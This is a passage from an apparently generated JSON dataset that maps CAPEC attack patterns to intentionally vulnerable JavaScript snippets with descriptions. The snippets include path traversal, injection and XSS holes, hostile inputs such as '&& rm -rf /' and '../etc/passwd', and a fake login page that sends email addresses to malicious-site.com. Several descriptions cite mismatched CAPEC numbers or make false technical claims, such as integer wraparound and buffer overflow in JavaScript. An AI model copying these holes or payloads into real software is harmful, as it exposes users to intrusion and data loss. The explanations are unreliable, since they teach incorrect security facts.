        "description": "This JavaScript code snippet creates an HTTP server that processes incoming requests and extracts query parameters from the URL. The 'debug' and 'role' parameters are directly used to control application behavior without any sanitization or validation. If 'debug' is set to '1', debug mode is enabled, and if 'role' is set to 'admin', admin privileges are granted. This demonstrates the vulnerability described in the CAPEC, where user-controlled variables can manipulate application logic, leading to potential security issues such as improper authorization and external control of system settings."
    },
    {
        "capec_id": "78",
        "capec_name": "Using Escaped Slashes in Alternate Encoding",
        "code_snippet": "const fs = require('fs');\n\nfunction readFile(filePath) {\n  // Validate input before canonicalization\n  if (!filePath || typeof filePath !== 'string') {\n    throw new Error('Invalid file path');\n  }\n\n  // Canonicalize the path\n  const canonicalPath = filePath.replace(/\\\\/g, '/');\n\n  // Validate the canonicalized path\n  if (canonicalPath.includes('..')) {\n    throw new Error('Path traversal attempt detected');\n  }\n\n  // Read the file\n  fs.readFile(canonicalPath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\n// Example usage\nreadFile('..\\\\etc\\\\passwd');",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to the CAPEC 'Using Escaped Slashes in Alternate Encoding' and associated CWEs. The function `readFile` takes a file path as input and attempts to read the file. Initially, it validates the input to ensure it is a string. However, it performs this validation before canonicalizing the path, which is a mistake (CWE-180). The canonicalization step replaces backslashes with forward slashes, but this is done after the initial validation, potentially allowing an attacker to bypass the validation using alternate encoding. The code also attempts to prevent path traversal (CWE-22) by checking for '..' in the canonicalized path, but this check is insufficient if the input is not properly canonicalized first. This snippet highlights the importance of correct order in validation and canonicalization to prevent security issues."
    },
    {
        "capec_id": "79",
        "capec_name": "Using Slashes in Alternate Encoding",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction readFile(userInput) {\n  // Improper input validation (CWE-20)\n  if (!userInput) {\n    throw new Error('Invalid input');\n  }\n\n  // Incorrect behavior order: Validate before canonicalize (CWE-180)\n  if (userInput.includes('..') || userInput.includes('%2e%2e')) {\n    throw new Error('Path traversal attempt detected');\n  }\n\n  // Canonicalize the path\n  const safePath = path.normalize(userInput);\n\n  // External control of file name or path (CWE-73)\n  const filePath = path.join(__dirname, safePath);\n\n  // Path traversal (CWE-22)\n  if (!filePath.startsWith(__dirname)) {\n    throw new Error('Path traversal attempt detected');\n  }\n\n  // Read the file\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\n// Example usage\nreadFile('../etc/passwd');",
        "description": "This JavaScript code snippet demonstrates a vulnerable file reading function that embodies the main idea of CAPEC-147: Using Slashes in Alternate Encoding. The function `readFile` takes user input to construct a file path and read its content. The code contains several weaknesses: \n1. Improper input validation (CWE-20) by only checking if the input is not empty.\n2. Incorrect behavior order: Validate before canonicalize (CWE-180) by checking for path traversal patterns before normalizing the path.\n3. External control of file name or path (CWE-73) by allowing user input to influence the file path.\n4. Path traversal (CWE-22) by not properly neutralizing special elements within the pathname.\n\nThe code attempts to detect path traversal attempts by checking for '..' and '%2e%2e' before canonicalizing the path, which is incorrect. This allows an attacker to bypass the checks using alternate encodings and access restricted files."
    },
    {
        "capec_id": "80",
        "capec_name": "Using UTF-8 Encoding to Bypass Validation Logic",
        "code_snippet": "const fs = require('fs');\n\nfunction isValidPath(path) {\n  // Validate the path using a simple regex\n  const validPathRegex = /^[a-zA-Z0-9_\\/]+$/;\n  return validPathRegex.test(path);\n}\n\nfunction readFile(filePath) {\n  if (!isValidPath(filePath)) {\n    throw new Error('Invalid file path');\n  }\n\n  // Canonicalize the file path\n  const canonicalPath = decodeURIComponent(filePath);\n\n  // Read the file content\n  fs.readFile(canonicalPath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\n// Example usage with a potentially harmful UTF-8 encoded input\nconst userInput = '%2E%2E%2F%2E%2E%2Fetc%2Fpasswd'; // Encoded '../etc/passwd'\nreadFile(userInput);",
        "description": "This JavaScript code snippet demonstrates a vulnerability where UTF-8 encoding can be used to bypass validation logic. The `isValidPath` function attempts to validate the file path using a simple regex, but it does so before canonicalizing the input. The `readFile` function then decodes the potentially harmful UTF-8 encoded input and reads the file content. This represents CWE-180 (Incorrect Behavior Order: Validate Before Canonicalize) and CWE-20 (Improper Input Validation). The example usage shows how an attacker could use UTF-8 encoding to bypass the validation and access sensitive files, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "81",
        "capec_name": "Web Server Logs Tampering",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const logEntry = `${new Date().toISOString()} - ${req.method} ${req.url} - ${req.headers['user-agent']}`;\n  fs.appendFile('server.log', logEntry + '\\n', (err) => {\n    if (err) throw err;\n  });\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Hello, world!');\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server logs each request to a file named 'server.log'. The log entry includes the current timestamp, HTTP method, URL, and user-agent header. However, the code does not sanitize or neutralize the input data before writing it to the log file, making it vulnerable to log tampering attacks. An attacker could inject malicious data into the log file, potentially masking other malicious activities or targeting log processing agents. This snippet embodies the main idea of CAPEC- Web Server Logs Tampering and demonstrates related CWEs such as Improper Output Neutralization for Logs (CWE-117), CRLF Injection (CWE-93), and Improper Input Validation (CWE-20)."
    },
    {
        "capec_id": "82",
        "capec_name": "DEPRECATED: Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst app = express();\n\napp.use(bodyParser.text({ type: 'application/xml' }));\n\napp.post('/upload', (req, res) => {\n  const xml = req.body;\n  xml2js.parseString(xml, (err, result) => {\n    if (err) {\n      return res.status(400).send('Invalid XML');\n    }\n    // Process the XML data\n    res.send('XML processed successfully');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that accepts XML data via a POST request. The XML data is parsed using the xml2js library. However, the code does not validate the XML against a schema (CWE-112), does not neutralize special elements (CWE-91), and does not restrict external entity references (CWE-611) or recursive entity references (CWE-776). This makes the server vulnerable to various XML-based attacks, such as XML Denial of Service (XDoS), XML Injection, and XML External Entity (XXE) attacks. The code represents the main idea of the deprecated CAPEC by demonstrating how improper handling of XML can lead to security vulnerabilities."
    },
    {
        "capec_id": "83",
        "capec_name": "XPath Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const xmlData = `<users><user><username>${username}</username><password>${password}</password></user></users>`;\n\n  xml2js.parseString(xmlData, (err, result) => {\n    if (err) {\n      res.status(500).send('Error parsing XML');\n      return;\n    }\n    // Simulate XPath query\n    const user = result.users.user.find(u => u.username[0] === username && u.password[0] === password);\n    if (user) {\n      res.send('Login successful');\n    } else {\n      res.send('Invalid credentials');\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable web application using Express.js. The application accepts user input for login credentials via a POST request. The input is directly embedded into an XML structure without proper sanitization, which is then parsed using the xml2js library. This setup is susceptible to XPath Injection attacks, as an attacker can craft malicious input to manipulate the XML structure and bypass authentication. The code embodies the main idea of CAPEC-91 (XPath Injection) and related CWEs, highlighting the risks of improper input validation and neutralization."
    },
    {
        "capec_id": "84",
        "capec_name": "XQuery Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nconst xml2js = require('xml2js');\nconst fs = require('fs');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/search', (req, res) => {\n  const userInput = req.body.query;\n  const xquery = `for $x in doc('users.xml')/users/user where $x/name = '${userInput}' return $x`;\n\n  fs.readFile('users.xml', 'utf8', (err, data) => {\n    if (err) {\n      res.status(500).send('Error reading XML file');\n      return;\n    }\n\n    xml2js.parseString(data, (err, result) => {\n      if (err) {\n        res.status(500).send('Error parsing XML file');\n        return;\n      }\n\n      // Simulate XQuery execution (vulnerable to injection)\n      const users = result.users.user.filter(user => user.name[0] === userInput);\n      res.send(users);\n    });\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of an XQuery injection attack in a Node.js application using the Express framework. The code sets up a simple web server that listens for POST requests on the '/search' endpoint. It reads user input from the request body and constructs an XQuery expression using this input without proper validation or neutralization. The constructed XQuery is then used to filter user data from an XML file. This approach is vulnerable to XQuery injection, as an attacker can manipulate the input to alter the structure of the query and potentially access unauthorized data. This example embodies the main idea of CAPEC-74 and related CWEs, highlighting the risks of improper neutralization of special elements in XQuery expressions."
    },
    {
        "capec_id": "85",
        "capec_name": "AJAX Footprinting",
        "code_snippet": "function fetchUserData(userId) {\n  var xhr = new XMLHttpRequest();\n  xhr.open('GET', '/getUserData?id=' + userId, true);\n  xhr.onreadystatechange = function() {\n    if (xhr.readyState == 4 && xhr.status == 200) {\n      var userData = JSON.parse(xhr.responseText);\n      document.getElementById('user-info').innerHTML = userData.name;\n    }\n  };\n  xhr.send();\n}\n\n// Example usage\nfetchUserData('<script>alert(\"XSS\")</script>');",
        "description": "This JavaScript code snippet demonstrates an AJAX request to fetch user data based on a user ID. The function `fetchUserData` sends an HTTP GET request to the server with the user ID as a query parameter. The server's response is then parsed and inserted into the HTML element with the ID 'user-info'. This code is vulnerable to several issues: \n1. **Improper Neutralization of Input During Web Page Generation (CWE-79)**: The user input is directly inserted into the HTML without proper sanitization, making it susceptible to XSS attacks.\n2. **Improper Input Validation (CWE-20)**: The user ID is not validated before being used in the request, allowing potentially malicious input.\n3. **Improper Encoding or Escaping of Output (CWE-116)**: The response data is not properly encoded or escaped before being inserted into the HTML, which can lead to XSS.\n4. **Use of Less Trusted Source (CWE-348)**: The code assumes the server response is trustworthy without verification.\n\nThis snippet embodies the main idea of AJAX Footprinting by showing how frequent client-server interactions can be exploited to gather information and identify vulnerabilities, which can then be used for further attacks like XSS."
    },
    {
        "capec_id": "86",
        "capec_name": "XSS Through HTTP Headers",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const userAgent = req.headers['user-agent'];\n  res.writeHead(200, {'Content-Type': 'text/html'});\n  res.end(`<html><body><h1>Welcome!</h1><p>Your user agent is: ${userAgent}</p></body></html>`);\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates an HTTP server using Node.js. The server reads the 'User-Agent' header from incoming HTTP requests and includes it in the HTML response without any validation or sanitization. This represents the CAPEC 'XSS Through HTTP Headers' by demonstrating how unvalidated data from HTTP headers can be injected into a web page, leading to potential XSS vulnerabilities. The related CWEs highlight the risks of improper neutralization of script-related HTML tags (CWE-80), input during web page generation (CWE-79), and HTTP headers (CWE-644), as well as the dangers of incomplete denylist-based protections (CWE-692)."
    },
    {
        "capec_id": "87",
        "capec_name": "Forceful Browsing",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Simulated user roles\nconst users = {\n  'user1': 'admin',\n  'user2': 'guest'\n};\n\n// Middleware to check authentication\nfunction checkAuth(req, res, next) {\n  const user = req.query.user;\n  if (!user || !users[user]) {\n    return res.status(401).send('Unauthorized');\n  }\n  req.user = user;\n  next();\n}\n\n// Middleware to check authorization\nfunction checkAdmin(req, res, next) {\n  if (users[req.user] !== 'admin') {\n    return res.status(403).send('Forbidden');\n  }\n  next();\n}\n\n// Public route\napp.get('/public', (req, res) => {\n  res.send('This is a public page');\n});\n\n// Protected route\napp.get('/admin', checkAuth, (req, res) => {\n  res.send('This is an admin page');\n});\n\n// Start the server\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server with two routes: a public route and a protected admin route. The 'checkAuth' middleware checks if the user is authenticated by verifying the presence of a user query parameter. However, the 'checkAdmin' middleware, which should enforce authorization for the admin route, is not applied. This oversight allows any authenticated user to access the '/admin' route by forcefully browsing to it, embodying the concept of 'Forceful Browsing' (CAPEC-111). The code also demonstrates CWE-425 (Direct Request) and CWE-285 (Improper Authorization) by not adequately enforcing authorization checks on the '/admin' route."
    },
    {
        "capec_id": "88",
        "capec_name": "OS Command Injection",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction executeCommand(userInput) {\n  exec(`ls ${userInput}`, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// Example usage\nexecuteCommand(''); // Safe input\nexecuteCommand('&& rm -rf /'); // Malicious input",
        "description": "This JavaScript code snippet demonstrates an OS Command Injection vulnerability. The `executeCommand` function takes user input and directly incorporates it into an `exec` call to list directory contents using the `ls` command. This code is vulnerable because it does not properly validate or sanitize the user input, allowing an attacker to inject arbitrary commands. For example, an attacker could input '&& rm -rf /' to delete the root directory, demonstrating the potential for severe damage. This snippet embodies the main idea of CAPEC-88 and related CWEs, highlighting the risks of improper input validation and neutralization in command execution."
    },
    {
        "capec_id": "89",
        "capec_name": "Pharming",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nconst server = http.createServer((req, res) => {\n  const targetHost = 'trustedbank.com';\n  const targetIP = '192.168.1.100';\n\n  dns.reverse(req.connection.remoteAddress, (err, hostnames) => {\n    if (err || !hostnames.includes(targetHost)) {\n      res.writeHead(403, {'Content-Type': 'text/plain'});\n      res.end('Access Denied');\n      return;\n    }\n\n    http.get(`http://${targetIP}`, (resp) => {\n      let data = '';\n      resp.on('data', (chunk) => { data += chunk; });\n      resp.on('end', () => {\n        res.writeHead(200, {'Content-Type': 'text/html'});\n        res.end(data);\n      });\n    }).on('error', () => {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Internal Server Error');\n    });\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that attempts to validate the client's hostname using reverse DNS resolution before allowing access to a supposedly trusted site. The server checks if the client's IP address resolves to 'trustedbank.com' and then proxies the request to a hardcoded IP address '192.168.1.100'. This code is vulnerable to pharming attacks because it relies on reverse DNS resolution (CWE-350) and does not properly verify the origin of the data (CWE-346). An attacker could manipulate DNS responses to impersonate the trusted site, leading the victim to a malicious server. Additionally, the code does not perform any integrity checks on the data received from the target IP (CWE-494), making it susceptible to further exploitation."
    },
    {
        "capec_id": "90",
        "capec_name": "Reflection Attack in Authentication Protocol",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Echo the received challenge back to the client\n    socket.write(data);\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\n\nclient.connect(1337, '127.0.0.1', () => {\n  const challenge = 'CHALLENGE_STRING';\n  client.write(challenge);\n\n  client.on('data', (data) => {\n    if (data.toString() === challenge) {\n      console.log('Authentication successful');\n    } else {\n      console.log('Authentication failed');\n    }\n    client.destroy();\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a simple authentication protocol that is vulnerable to a reflection attack. The server listens for incoming connections and echoes back any received data. The client sends a challenge string to the server and checks if the response matches the original challenge. If it does, the client considers the authentication successful. This setup is vulnerable because an attacker can reflect the challenge back to the client, bypassing the need for legitimate credentials. This example embodies the main idea of CAPEC-301 (Reflection Attack in an Authentication Protocol) and highlights the weaknesses described in related CWEs, such as incorrect implementation of authentication algorithms (CWE-303) and authentication bypass by spoofing (CWE-290)."
    },
    {
        "capec_id": "91",
        "capec_name": "DEPRECATED: XSS in IMG Tags",
        "code_snippet": "<html>\n<body>\n  <img src=\"x\" onerror=\"alert('XSS')\">\n</body>\n</html>",
        "description": "This HTML code snippet demonstrates a Cross-Site Scripting (XSS) vulnerability within an IMG tag. The 'src' attribute of the IMG tag is set to an invalid value ('x'), which triggers the 'onerror' event. The 'onerror' event handler contains a JavaScript alert function that executes when the error occurs. This example embodies the main idea of the deprecated CAPEC-IMAGE XSS attack pattern, which is now part of CAPEC-18: XSS Targeting Non-Script Elements. The related CWEs highlight various improper neutralizations of script elements, such as not correctly handling special characters or using incomplete denylist mechanisms. This code snippet represents how an attacker can inject malicious scripts into web pages by exploiting improper neutralization of script-related HTML tags."
    },
    {
        "capec_id": "92",
        "capec_name": "Forced Integer Overflow",
        "code_snippet": "function allocateBuffer(size) {\n  // Simulate an integer overflow by using a large value\n  let bufferSize = size + 1;\n  let buffer = new ArrayBuffer(bufferSize);\n  let view = new Uint8Array(buffer);\n  for (let i = 0; i <= size; i++) {\n    view[i] = 0x41; // Fill buffer with 'A'\n  }\n  return buffer;\n}\n\n// Example usage\nlet size = 0xFFFFFFFF; // Maximum 32-bit unsigned integer\nlet buffer = allocateBuffer(size);\nconsole.log(buffer);",
        "description": "This JavaScript code snippet demonstrates a forced integer overflow vulnerability. The function `allocateBuffer` takes a size parameter and attempts to allocate a buffer of size `size + 1`. When `size` is set to the maximum 32-bit unsigned integer (0xFFFFFFFF), adding 1 causes an integer overflow, wrapping around to 0. This results in a buffer of size 0 being allocated, but the subsequent loop attempts to write beyond the allocated buffer, leading to a potential buffer overflow. This example embodies the main idea of CAPEC-190 (Forced Integer Overflow) and related CWEs such as CWE-190 (Integer Overflow or Wraparound) and CWE-680 (Integer Overflow to Buffer Overflow)."
    },
    {
        "capec_id": "93",
        "capec_name": "Log Injection-Tampering-Forging",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.use(express.json());\n\napp.post('/login', (req, res) => {\n    const username = req.body.username;\n    const password = req.body.password;\n\n    // Log the login attempt\n    fs.appendFile('server.log', `Login attempt: ${username}, Password: ${password}\\n`, (err) => {\n        if (err) throw err;\n    });\n\n    // Simulate login process\n    if (username === 'admin' && password === 'password') {\n        res.send('Login successful');\n    } else {\n        res.send('Login failed');\n    }\n});\n\napp.listen(3000, () => {\n    console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a vulnerable logging mechanism in an Express.js application. The code logs user login attempts, including both the username and password, directly into a log file without any sanitization or neutralization of special characters. This can lead to several vulnerabilities as described in the CAPEC and related CWEs:\n\n1. **Improper Output Neutralization for Logs (CWE-117)**: The code does not neutralize special characters in the log entries, which could allow an attacker to inject malicious log entries.\n2. **Failure to Sanitize Special Elements (CWE-75)**: User input is directly logged without filtering special elements, which could be exploited for log injection attacks.\n3. **Improper Neutralization of Escape, Meta, or Control Sequences (CWE-150)**: The code does not handle escape sequences, which could be used to manipulate log files.\n4. **Insertion of Sensitive Information into Log File (CWE-532)**: Sensitive information such as passwords is logged, which could be exposed to unauthorized users.\n5. **Logging of Excessive Data (CWE-779)**: Logging sensitive and excessive data can make log files difficult to manage and analyze, hindering forensic efforts.\n\nOverall, this code snippet demonstrates how improper logging practices can lead to security vulnerabilities, emphasizing the need for proper sanitization and neutralization of log data."
    },
    {
        "capec_id": "94",
        "capec_name": "Adversary in the Middle (AiTM)",
        "code_snippet": "const http = require('http');\nconst net = require('net');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const target = url.parse(req.url);\n  const client = net.createConnection(target.port, target.hostname, () => {\n    client.write(`${req.method} ${target.path} HTTP/1.1\\r\\n` +\n                 `Host: ${target.hostname}\\r\\n` +\n                 `Connection: close\\r\\n\\r\\n`);\n  });\n\n  client.on('data', (data) => {\n    // Potentially modify data here (CWE-300)\n    res.write(data);\n  });\n\n  client.on('end', () => {\n    res.end();\n  });\n\n  req.on('data', (chunk) => {\n    // Potentially capture and replay data here (CWE-294)\n    client.write(chunk);\n  });\n\n  req.on('end', () => {\n    client.end();\n  });\n}).listen(8080);",
        "description": "This JavaScript code snippet sets up a basic HTTP proxy server using Node.js. The server listens for incoming HTTP requests and forwards them to the target server. The proxy can intercept and potentially modify the data being transmitted between the client and the server, embodying the 'Adversary in the Middle (AiTM)' attack described in CAPEC. The code demonstrates vulnerabilities such as CWE-300 (Channel Accessible by Non-Endpoint) by allowing the proxy to access and modify the communication channel, and CWE-294 (Authentication Bypass by Capture-replay) by potentially capturing and replaying data chunks. This setup does not verify the identity of the endpoints or ensure the integrity of the communication channel, making it susceptible to various attacks."
    },
    {
        "capec_id": "95",
        "capec_name": "WSDL Scanning",
        "code_snippet": "const express = require('express');\nconst fs = require('fs');\nconst app = express();\n\n// Exposing WSDL file\napp.get('/service.wsdl', (req, res) => {\n  fs.readFile('path/to/service.wsdl', 'utf8', (err, data) => {\n    if (err) {\n      res.status(500).send('Error reading WSDL file');\n      return;\n    }\n    res.set('Content-Type', 'text/xml');\n    res.send(data);\n  });\n});\n\n// Example of a service endpoint that could be discovered via WSDL scanning\napp.get('/getUserInfo', (req, res) => {\n  const userId = req.query.userId;\n  if (!userId) {\n    res.status(400).send('Missing userId parameter');\n    return;\n  }\n  // Simulate database access\n  const userInfo = { id: userId, name: 'John Doe', email: 'john.doe@example.com' };\n  res.json(userInfo);\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that exposes a WSDL file and a service endpoint. The '/service.wsdl' endpoint serves the WSDL file, which can be scanned by an attacker to reveal sensitive information about the web service. The '/getUserInfo' endpoint demonstrates a service that could be discovered through WSDL scanning. It uses the HTTP GET method and includes a sensitive query string parameter 'userId', which could lead to exposure of sensitive user information. This code embodies the main idea of CAPEC-220 (WSDL Scanning) and highlights related CWEs such as CWE-651 (Exposure of WSDL File Containing Sensitive Information) and CWE-598 (Use of GET Request Method With Sensitive Query Strings)."
    },
    {
        "capec_id": "96",
        "capec_name": "Block Access to Libraries",
        "code_snippet": "const fs = require('fs');\n\nfunction readConfigFile(filePath) {\n  try {\n    if (!fs.existsSync(filePath)) {\n      throw new Error('Configuration file not found');\n    }\n    const data = fs.readFileSync(filePath, 'utf8');\n    return JSON.parse(data);\n  } catch (err) {\n    console.error('Error reading configuration file:', err.message);\n    // Fallback to default configuration\n    return { defaultConfig: true };\n  }\n}\n\nconst config = readConfigFile('/path/to/config.json');\nconsole.log('Configuration:', config);",
        "description": "This JavaScript code snippet demonstrates a scenario where an application attempts to read a configuration file using the 'fs' library. The 'readConfigFile' function checks if the file exists and reads its content. If the file is not found or an error occurs during reading, it catches the error and logs it, then falls back to a default configuration. This embodies the CAPEC idea of handling blocked access to libraries (in this case, the file system library) and ensuring the application does not enter an insecure state. The code also touches on CWE-589 (Call to Non-ubiquitous API) by assuming the 'fs' library is available, CWE-1177 (Use of Prohibited Code) by using 'fs' which might be restricted in some environments, and CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) by relying on external file system access."
    },
    {
        "capec_id": "97",
        "capec_name": "Cryptanalysis",
        "code_snippet": "const crypto = require('crypto');\n\n// Using a weak cryptographic algorithm (MD5)\nfunction encrypt(text) {\n  const hash = crypto.createHash('md5');\n  hash.update(text);\n  return hash.digest('hex');\n}\n\n// Generating a weak and predictable IV\nfunction generateWeakIV() {\n  return '1234567890123456'; // 16 bytes IV\n}\n\n// Encrypting data with a weak IV and a weak algorithm\nfunction encryptData(data) {\n  const iv = generateWeakIV();\n  const key = crypto.randomBytes(32); // 256-bit key\n  const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\nconst plaintext = 'Sensitive data';\nconsole.log('Encrypted with MD5:', encrypt(plaintext));\nconsole.log('Encrypted with AES and weak IV:', encryptData(plaintext));",
        "description": "This JavaScript code snippet demonstrates several cryptographic weaknesses as described in the CAPEC and related CWEs. The `encrypt` function uses the broken and risky MD5 algorithm (CWE-327) to hash a given text. The `generateWeakIV` function generates a weak and predictable initialization vector (IV) (CWE-1204). The `encryptData` function uses AES-256-CBC encryption with a weak IV, which compromises the security of the encryption. This code highlights the importance of using strong, proven cryptographic algorithms and generating unpredictable IVs to ensure the security of cryptographic operations."
    },
    {
        "capec_id": "98",
        "capec_name": "Phishing",
        "code_snippet": "function redirectToPhishingSite() {\n  var userInput = prompt('Please enter your email to continue:');\n  var redirectUrl = 'http://malicious-site.com/login?email=' + encodeURIComponent(userInput);\n  window.location.href = redirectUrl;\n}\n\nfunction displayFakeLogin() {\n  document.body.innerHTML = '<h2>Login to Your Account</h2><form onsubmit=\"redirectToPhishingSite(); return false;\"><input type=\"text\" placeholder=\"Email\" required><input type=\"password\" placeholder=\"Password\" required><button type=\"submit\">Login</button></form>';\n}\n\ndisplayFakeLogin();",
        "description": "This JavaScript code snippet demonstrates a phishing attack by creating a fake login form that prompts the user to enter their email and password. When the form is submitted, the user is redirected to a malicious site with their email as a query parameter. This embodies the main idea of phishing (CAPEC) by masquerading as a legitimate login form to gather confidential information. The code also incorporates CWE-601 (URL Redirection to Untrusted Site) by redirecting the user to a malicious URL, and CWE-451 (User Interface Misrepresentation of Critical Information) by displaying a fake login form that misrepresents its true purpose."
    },
    {
        "capec_id": "99",
        "capec_name": "DEPRECATED: XML Parser Attack",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst app = express();\n\napp.use(bodyParser.text({ type: 'application/xml' }));\n\napp.post('/upload', (req, res) => {\n  const xml = req.body;\n  xml2js.parseString(xml, (err, result) => {\n    if (err) {\n      return res.status(400).send('Invalid XML');\n    }\n    // Process the XML data\n    res.send('XML processed successfully');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that accepts XML data via a POST request. The XML data is parsed using the xml2js library. The code does not validate the XML against a schema (CWE-112), does not properly neutralize special elements (CWE-91), and does not restrict XML external entity references (CWE-611). This makes the application vulnerable to various XML-based attacks, such as XML Injection, XML External Entity (XXE) attacks, and processing of malicious XML payloads."
    },
    {
        "capec_id": "100",
        "capec_name": "Overflow Buffers",
        "code_snippet": "function vulnerableFunction(input) {\n  var buffer = new Array(10);\n  for (var i = 0; i <= input.length; i++) {\n    buffer[i] = input[i];\n  }\n  return buffer;\n}\n\n// Example usage\nvar userInput = 'A'.repeat(20);\nconsole.log(vulnerableFunction(userInput));",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability. The function `vulnerableFunction` takes an `input` and attempts to copy its contents into a fixed-size buffer of length 10. The loop iterates over the length of the input, which can exceed the buffer's size, leading to a buffer overflow. This example embodies the main idea of CAPEC-1000 (Overflow Buffers) and is related to several CWEs: CWE-120 (Buffer Copy without Checking Size of Input), CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer), and CWE-131 (Incorrect Calculation of Buffer Size). The code does not check if the input length exceeds the buffer size, allowing an adversary to write past the buffer's boundaries, potentially causing a program crash or arbitrary code execution."
    },
    {
        "capec_id": "101",
        "capec_name": "Server Side Include (SSI) Injection",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const filePath = `./pages/${queryObject.page}.html`;\n\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/html'});\n      res.end('404 Not Found');\n      return;\n    }\n\n    // Vulnerable to SSI Injection\n    res.writeHead(200, {'Content-Type': 'text/html'});\n    res.end(data);\n  });\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads an HTML file based on user input from the URL query parameter 'page' and serves it without any input validation or sanitization. This lack of proper input validation (CWE-20) and improper neutralization of special elements (CWE-74) makes the server vulnerable to Server Side Include (SSI) Injection (CAPEC-97). An attacker could craft a URL with malicious input to include server-side directives, potentially leading to arbitrary code execution or information disclosure. The code demonstrates how improper handling of user input can lead to security vulnerabilities."
    },
    {
        "capec_id": "102",
        "capec_name": "Session Sidejacking",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n  if (req.url === '/login' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      const credentials = JSON.parse(body);\n      // Simulate session token generation\n      const sessionToken = '123456';\n      res.setHeader('Set-Cookie', `sessionToken=${sessionToken}`);\n      res.end('Logged in');\n    });\n  } else if (req.url === '/dashboard') {\n    const cookies = req.headers.cookie;\n    if (cookies && cookies.includes('sessionToken=123456')) {\n      res.end('Welcome to your dashboard');\n    } else {\n      res.end('Unauthorized');\n    }\n  } else {\n    res.end('Not Found');\n  }\n});\nserver.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js that handles login and dashboard access. The login endpoint accepts POST requests with user credentials, generates a session token, and sets it in a cookie without the 'Secure' attribute. The dashboard endpoint checks for the session token in the cookies to grant access. This code embodies the main idea of Session Sidejacking (CAPEC-61) by transmitting sensitive information (session token) in cleartext and without proper security attributes, making it susceptible to interception and unauthorized use. The related CWEs (e.g., CWE-319, CWE-614) highlight the vulnerabilities in the code, such as cleartext transmission of sensitive information and lack of secure cookie attributes."
    },
    {
        "capec_id": "103",
        "capec_name": "Clickjacking",
